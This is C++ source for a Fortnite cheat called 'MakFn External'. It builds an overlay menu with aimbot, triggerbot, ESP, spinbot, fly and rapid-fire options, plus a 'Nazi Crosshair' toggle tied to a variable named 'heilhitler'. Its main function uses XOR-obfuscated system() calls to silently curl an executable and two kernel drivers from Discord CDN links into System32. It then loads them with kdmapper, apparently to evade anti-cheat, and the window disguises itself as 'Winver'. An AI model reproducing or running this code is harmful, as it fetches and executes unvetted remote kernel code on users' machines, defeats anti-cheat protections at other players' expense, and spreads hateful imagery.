		colors[ImGuiCol_PlotLines] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		colors[ImGuiCol_PlotLinesHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		colors[ImGuiCol_PlotHistogram] = ImVec4(0.40f, 0.39f, 0.38f, 0.63f);
		colors[ImGuiCol_PlotHistogramHovered] = ImVec4(0.25f, 1.00f, 0.00f, 1.00f);
		colors[ImGuiCol_TextSelectedBg] = ImVec4(0.25f, 1.00f, 0.00f, 0.43f);
		colors[ImGuiCol_ModalWindowDarkening] = ImVec4(1.00f, 0.98f, 0.95f, 0.73f);

		ImGui::GetStyle().WindowPadding = ImVec2(15, 15);
		ImGui::GetStyle().WindowRounding = 5.0f;
		ImGui::GetStyle().FramePadding = ImVec2(5, 5);
		ImGui::GetStyle().FrameRounding = 4.0f;
		ImGui::GetStyle().ItemSpacing = ImVec2(12, 8);
		ImGui::GetStyle().ItemInnerSpacing = ImVec2(8, 6);
		ImGui::GetStyle().IndentSpacing = 25.0f;
		ImGui::GetStyle().ScrollbarSize = 15.0f;
		ImGui::GetStyle().ScrollbarRounding = 9.0f;
		ImGui::GetStyle().GrabMinSize = 5.0f;
		ImGui::GetStyle().GrabRounding = 3.0f;

		ImGui::SetNextWindowSize({ 450, 470 });
		ImGui::Begin(menu.decrypt(), NULL, ImGuiWindowFlags_::ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_::ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_::ImGuiWindowFlags_NoResize | ImGuiWindowFlags_::ImGuiWindowFlags_NoCollapse);
		ImVec2 p = ImGui::GetWindowPos();
		static ImVec4 inactive = ImColor(0, 136, 255, 255);
		static ImVec4 active = ImColor(255, 255, 255, 255);
		static int tab = 0;

		ImGui::SetCursorPos(ImVec2(15.000f, 10.000f));
		if (ImGui::Button("Aim", ImVec2(130.000f, 28.000f))) { tab = 1; }
		ImGui::SameLine();
		if (ImGui::Button("Visuals", ImVec2(130.000f, 28.000f))) { tab = 2; }
		ImGui::SameLine();
		if (ImGui::Button("Misc", ImVec2(130.000f, 28.000f))) { tab = 3; }

		ImGui::Spacing();
		switch (tab) {
		case 0:
			ImGui::Text(" [+] MakFn 1.2");
			ImGui::Text(" [+] MakFn Menu Recreation");
			ImGui::Text(" [+] Discord.gg/makfn");
			ImGui::Text(" [+] Fortnite External");
			break;
		case 1:
			ImGui::Checkbox(aim1.decrypt(), &MouseMovementAimbot);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Soft MouseMovent Modified For Players: (Example: Legit Aimbot and Softaim Combined"));
				ImGui::EndTooltip();
			}
			ImGui::Combo(aim3.decrypt(), &hitboxpos, hitboxes, sizeof(hitboxes) / sizeof(*hitboxes));
			ImGui::Spacing();
			ImGui::SliderInt("Aimbot Distance", &AimFOV, 1.5f, 500.f);
			// ImGui::SliderInt("Smoothness", &smooth, 3.f, 10.f);
			ImGui::Spacing();
			ImGui::Checkbox("FovCircle", &fovCircle);
			if (fovCircle == true)
			{
				ImGui::Checkbox("FovCircle Filled", &Filledfov);
				ImGui::Spacing();
			}
			ImGui::Checkbox("FovSquare", &square);
			ImGui::Checkbox("Fov Crosshair", &crosshair);
			ImGui::Checkbox("Nazi Crosshair", &heilhitler);
			ImGui::Spacing();
			ImGui::SliderInt("Fov Size", &FovSize, 25.f, 250.f);
			if (square == true)
			{
				fovCircle = false;
				Filledfov = false;
			}
			if (fovCircle == true)
			{
				square = false;
			}
			ImGui::Spacing();
			ImGui::Checkbox("Aimbot AimCircle", &DrawEnemyFov);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Draws a Aimbot Fov on a Enemys Players head"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("AimCheck", &AimCheck);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("When aiming at a enemy player it will say the distance and the body part."));
				ImGui::EndTooltip();
			}
			ImGui::Spacing();
			ImGui::Checkbox("TriggerBot", &triggerbot);
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 2:
			ImGui::Checkbox("Filled Box", &fillbox);
			ImGui::Checkbox("Outlined Box", &Esp_fbox);
			ImGui::Checkbox(BoxCorner.decrypt(), &Esp_box);
			ImGui::Checkbox("3D Box", &ThreeDBox);
			ImGui::Checkbox("Skeleton Esp", &Esp_Skeleton);
			ImGui::Checkbox("Snaplines", &Esp_line);
			ImGui::Checkbox("Distance Esp", &Esp_Distance);
			ImGui::Spacing();
			ImGui::SliderInt("Esp Rendering", &VisDist, 1.f, 1000.f);
			ImGui::Spacing();
			ImGui::Checkbox("Reload Check", &reloadCheck);
			ImGui::Checkbox("PlayerBot Check", &playerbot);
			ImGui::Spacing();
			ImGui::Checkbox("VisCheck", &vischeck);
			ImGui::Checkbox("Particles", &particles);
			ImGui::Spacing();
			ImGui::Text("Added TeamCheck!");
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 3:
			ImGui::Checkbox("SpinBot", &spinbot);
			if (spinbot == true)
			{
				ImGui::Spacing();
				ImGui::SliderInt("SpinBot Speed", &SpinBotValue, 10.f, 900.f);
			}
			ImGui::Checkbox("Fov Changer", &FOVChanger);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[!]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("FovChanger will mess with visuals"));
				ImGui::EndTooltip();
			}
			if (FOVChanger == true)
			{
				ImGui::Spacing();
				ImGui::SliderFloat("FOVChanger Value", &FOVChangerValue, 1.f, 250.f);
			}
			ImGui::Checkbox("No MiniGun Cooldown", &nominigun);
			ImGui::Checkbox("Glitched Player", &glitch);
			ImGui::Checkbox("Rapid Fire", &RapidFire);
			ImGui::Checkbox("No Weapon Animation", &noweaponanimation);
			ImGui::Checkbox("Fly Hacking", &playerfly);
			ImGui::Checkbox("No Boat Gravity", &boatfly);
			ImGui::Checkbox("Gun CustomTimeDilation", &nospread);
			ImGui::Checkbox("AirStuck", &AirStuck);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(0, 136, 255, 255), ("[?]"));
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::Text(("Lets you float in the air"));
				ImGui::EndTooltip();
			}
			ImGui::Checkbox("Infinite Fuel", &fuel);
			ImGui::Checkbox("Aim in Air", &aiminair);
			ImGui::Spacing();
			ImGui::Checkbox("External Extentions", &DeveloperAdjust);
			if (DeveloperAdjust == true) {
				ImGui::TextColored(ImColor(144, 0, 255, 255), ("Hotkey Down To close"));
			}
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		}

		ImGui::End();
	}


	Init();

	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}



MSG Message = { NULL };

void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		xShutdown();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

void xShutdown()
{
	TriBuf->Release();
	D3dDevice->Release();
	p_Object->Release();

	DestroyWindow(Window);
	UnregisterClass("fgers", NULL);
}

void xCreateWindow()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpszClassName = "About Windows";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);

	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right;
		Height = GameRect.bottom;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, "About Windows", "Winver", WS_POPUP | WS_VISIBLE, 0, 0, Width, Height, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}

void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;
	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);
	IMGUI_CHECKVERSION();


	ImGui::CreateContext();
	ImGuiIO& io = ImGui::GetIO();
	(void)io;
	io.IniFilename = NULL;


	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);
	ImGui::StyleColorsClassic();

	XorS(font, "C:\\Windows\\Fonts\\verdanab.ttf");
	m_pFont = io.Fonts->AddFontFromFileTTF(font.decrypt(), 14.0f, nullptr, io.Fonts->GetGlyphRangesDefault());
}

int main(int argc, const char* argv[])
{

	SetConsoleTitleA(skCrypt("Discord"));

	system("cls");

	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\driverLoader.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\DUDUDUD.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\cheetoDriver2.sys >nul 2>&1").c_str());
	system(_xor_("cls").c_str());
	system(_xor_("cd C:\\Windows\\System32\\").c_str());
	system(_xor_("C:\\Windows\\System32\\driverLoader.exe C:\\Windows\\System32\\cheetoDriver2.sys C:\\Windows\\System32\\DUDUDUD.sys").c_str());

	system("cls");

	std::cout << "Waiting For fortnite";


	while (hwnd == NULL)
	{
		XorS(wind, "Fortnite  ");
		hwnd = FindWindowA(0, wind.decrypt());
		Sleep(100);
	}
	GetWindowThreadProcessId(hwnd, &processID);

	// ADD YOUR GET BASE ADDRESS
	if (driver->Init(FALSE)) {

		driver->Attach(processID);

		base_address = driver->GetModuleBase(L"FortniteClient-Win64-Shipping.exe");

	}

	system("cls");


	printf("Fortnites Base Address Is: %p", (void*)base_address);
	printf("\nMakfn Free External");



	xCreateWindow();
	xInitD3d();

	xMainLoop();
	xShutdown();

	return 0;
}
